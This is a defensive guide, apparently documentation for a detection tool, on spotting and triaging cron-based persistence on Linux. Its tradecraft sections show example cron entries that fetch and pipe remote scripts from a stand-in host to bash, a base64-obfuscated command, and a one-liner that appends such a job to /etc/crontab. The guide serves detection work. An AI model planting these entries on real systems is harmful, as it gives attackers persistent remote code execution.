# Cron Persistence

## Overview

Cron is a time-based job scheduler used in Unix-like systems to execute commands or scripts at specified intervals. It is one of the oldest and most widely used mechanisms for task automation in Linux environments.

Because cron provides reliable, recurring execution with minimal complexity, it is one of the most commonly abused persistence mechanisms by adversaries.

> **Cron persistence is not powerful because it is complex — it is powerful because it is predictable.**

---

## Why Attackers Use Cron for Persistence

Cron provides adversaries with:

- Reliable, scheduled execution  
- Minimal configuration complexity  
- User-level and system-level persistence options  
- Independence from system startup processes  
- Easy integration with existing scripts and tooling  

Unlike systemd, cron does not require deep system integration, making it ideal for rapid persistence deployment.

---

## Execution Semantics

Cron executes tasks based on time definitions specified in crontab files.

Common locations include:

- `/etc/crontab` (system-wide)
- `/etc/cron.d/` (modular system jobs)
- `/var/spool/cron/` (user-specific crontabs)
- `/etc/cron.*` (hourly, daily, weekly, monthly)

### Cron Format

```
* * * * * command
│ │ │ │ │
│ │ │ │ └── Day of week
│ │ │ └──── Month
│ │ └────── Day of month
│ └──────── Hour
└────────── Minute
```

### Execution Context

- System cron jobs may run as root or specified users  
- User crontabs run under the context of that user  
- Execution is non-interactive  

---

## Privilege Requirements

- Modifying `/etc/crontab` or `/etc/cron.d/` requires root  
- User crontabs can be modified without elevated privileges  

This allows adversaries to establish persistence at both privilege levels.

---

## Common Attacker Tradecraft

### 1. Periodic Payload Execution

Example:

```
* * * * * /tmp/update.sh
```

Why this works:
- Executes every minute  
- Ensures persistence even if payload is removed or interrupted  

---

### 2. Network-Based Execution Chains

Example:

```
*/5 * * * * curl http://evil.test/payload.sh | bash
```

Why attackers use this:
- No persistent payload required on disk  
- Remote control over payload content  
- Evasion of static file-based detection  

---

### 3. Obfuscated Commands

Example:

```
* * * * * echo ZWNobyAiZXZpbCI= | base64 -d | bash
```

Why attackers use this:
- Obfuscates intent  
- Bypasses simple string detection  
- Hides execution logic  

---

### 4. Masquerading as Legitimate Jobs

Examples:
- Backup scripts  
- Log rotation tasks  
- System update jobs  

Goal:
Blend malicious execution into expected administrative behavior.

---

### 5. Low-Frequency Persistence

Example:

```
0 3 * * 0 /usr/local/bin/update-check
```

Why attackers use this:
- Executes weekly at low visibility times  
- Reduces detection probability  
- Maintains long-term access  

---

## What Normal Looks Like

Legitimate cron usage typically involves:

- Scripts in standard directories:
  - `/usr/bin/`
  - `/usr/local/bin/`
- Clearly named scripts (backup, cleanup, maintenance)  
- Predictable scheduling patterns  
- No inline shell execution or network retrieval  

Example:

```
0 2 * * * /usr/bin/backup.sh
```

---

## What Malicious Use Looks Like

### High-Signal Indicators

- Execution from:
  - `/tmp`
  - `/dev/shm`
  - `/var/tmp`
- Inline execution (`bash -c`, `sh -c`)  
- Network retrieval (`curl`, `wget`)  
- Encoded or obfuscated commands  
- High-frequency execution (`* * * * *`)  

### Medium-Signal Indicators

- Unknown jobs in `/etc/cron.d/`  
- Scripts without clear purpose or documentation  
- Jobs running under unexpected users  

### Low-Signal Indicators

- Custom administrative scripts  
- Developer automation tasks  

---

## ATT&CK Mapping

- **T1053.003 – Scheduled Task/Job: Cron**

Cron persistence falls under adversary techniques involving:
- Scheduled execution  
- Automated tasking  
- Recurrent access mechanisms  

---

## Procedure Examples (Tradecraft)

Typical attacker workflow:

```
echo "* * * * * curl http://evil.test/a.sh | bash" >> /etc/crontab
```

or:

```
crontab -l | { cat; echo "* * * * * /tmp/update.sh"; } | crontab -
```

Execution flow:
1. Establish cron entry  
2. Ensure payload exists or is remotely accessible  
3. Allow scheduler to execute automatically  

---

## Analytical Guidance

### Key Question

> Is this scheduled task consistent with the system’s operational purpose?

---

### Focus Areas

1. Execution Path  
   - Is the script located in a trusted directory?  
   - Is it writable by non-privileged users?  

2. Command Structure  
   - Is it a simple binary execution or a complex shell chain?  
   - Are there signs of obfuscation?  

3. Frequency  
   - Does the execution interval make sense?  
   - Is it excessively frequent?  

4. User Context  
   - Which user is executing the job?  
   - Does it align with expected behavior?  

5. Origin  
   - Was the cron entry added recently?  
   - Does it correlate with known admin activity?  

---

## Triage Workflow

1. Enumerate cron jobs:

```
crontab -l
cat /etc/crontab
ls /etc/cron.d/
```

2. Inspect suspicious entries  

3. Validate referenced scripts  

4. Check file metadata:

```
stat <script>
```

5. Review logs (if available)  

6. Correlate with system activity  

---

## Evidence to Preserve

- Crontab entries  
- Referenced scripts or binaries  
- File metadata (timestamps, ownership)  
- System logs  
- Network activity (if present)  

---

## False Positive Reduction

To reduce false positives:

- Validate cron jobs against system purpose  
- Confirm expected administrative automation  
- Check script ownership and origin  
- Compare against baseline configurations  

---

## Why Tenax Checks This Surface

Cron provides:

- Reliable execution  
- Minimal configuration complexity  
- Broad usage across systems  

It is one of the most commonly abused persistence mechanisms due to its simplicity.

> Cron does not need to be stealthy to be effective. It only needs to execute reliably.

---

## Key Takeaway

Cron persistence is effective because it guarantees execution over time.

> The attacker does not need to maintain access manually — the scheduler does it for them.
